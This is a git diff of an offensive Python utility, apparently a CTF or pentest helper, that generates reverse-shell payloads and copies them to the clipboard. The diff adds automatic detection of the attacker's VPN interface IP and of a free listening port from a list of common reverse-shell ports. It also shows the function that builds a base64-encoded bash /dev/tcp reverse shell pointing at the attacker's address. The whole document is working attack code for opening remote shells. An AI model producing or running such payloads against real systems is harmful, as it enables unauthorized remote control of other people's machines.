@@ -6,6 +6,7 @@ import pyperclip
 import os
 import base64
 import netifaces
+import subprocess
 
 bold = "\033[1m"                                                                    
 green = "\033[32m"                  
@@ -32,7 +33,7 @@ parser = argparse.ArgumentParser(description="""
  ___/ / / / /  __/ / /_/  __/ /    
 /____/_/ /_/\___/_/\__/\___/_/     
                                                                       
-Version: v1.0.0 - 06/04/21 - Bides Das @Xyan1d3 """,formatter_class=RawTextHelpFormatter)
+Version: v1.0.1 - 06/04/21 - Bides Das @Xyan1d3 """,formatter_class=RawTextHelpFormatter)
 
 subparser = parser.add_subparsers(title="Available Modules", dest="module")
 rev = subparser.add_parser("rev",help="Revshell to clipboard")
@@ -71,12 +72,36 @@ pyexport.add_argument("--nohandler",help="Copies only the revshell payload. [Doe
 socat.add_argument("--nohandler",help="Copies only the revshell payload. [Does not start handler]",metavar="")
 
 args = parser.parse_args()
+
 def fetch_ip(): # This function IP of the NIC [default:tun0]
     nic = "tun0"
     if "tun0" not in netifaces.interfaces():
         aerr("No VPN detected...")
+        ainfo(f"Enter the Interface you want to listen on from {netifaces.interfaces()}")
+        nic = str(input("Interface Name : "))
 
-    netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
+    ipaddr = []
+    for interface in netifaces.interfaces():
+        try : 
+            for link in netifaces.ifaddresses(interface)[netifaces.AF_INET]:
+                ipaddr.append(link['addr'])
+        except KeyError:
+            ipaddr.append(0)
+    ip = ipaddr[netifaces.interfaces().index(nic)]
+    if ip == 0 :
+        aerr(f"Fatal Error: {nic} has no ip assigned.")
+        exit()
+    return ip
+
+def fetch_port(): # This function returns a free tcp port for catching reverse shell.
+    revshell_ports = [8888,9001,9002,9003,9004,9005,9999,7777,6666,5555,4444]
+    for each in revshell_ports:
+        op = subprocess.run(['netstat', '-tl'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+        if str(each) in op:
+            pass
+        else:
+            return each
+
 def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacker ip,attacker port & language og revshell and returns a full fleged reverse-shell
     bashi_b64 = base64.b64encode(f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1".encode()).decode()
     
@@ -99,12 +124,11 @@ def shell_cpy(language,ATTACKER_IP,ATTACKER_PORT): # This function takes attacke
         return payloads["bash"]
     return payloads[language]
 
-print(list(rev_sub.choices.keys()))
-if args.module == "rev": # Checks for  1st pos arg if its rev.
+if args.module == "rev": # Checks for 1st pos arg if its rev.
     if args.sub in list(rev_sub.choices.keys()): # Checks if the 2nd pos arg is valid language for revshell payload.
-        pyperclip.copy(shell_cpy(args.sub,"127.0.0.1",8888)) # It will take 2nd positional arg as language and copy the revshell in the clipboard.
+        pyperclip.copy(shell_cpy(args.sub,fetch_ip(),fetch_port())) # It will take 2nd positional arg as language and copy the revshell in the clipboard.
         #print(shell_cpy(args.sub,"127.0.0.1",8888))
     else:
-        pyperclip.copy(shell_cpy("bash","127.0.0.1",8888)) # If 2nd positional arg is not supplied it will fallback to bash base64 encoded revshell.
+        pyperclip.copy(shell_cpy("bash",fetch_ip(),fetch_port())) # If 2nd positional arg is not supplied it will fallback to bash base64 encoded revshell.
         #print(shell_cpy("bash","127.0.0.1",8888))
     
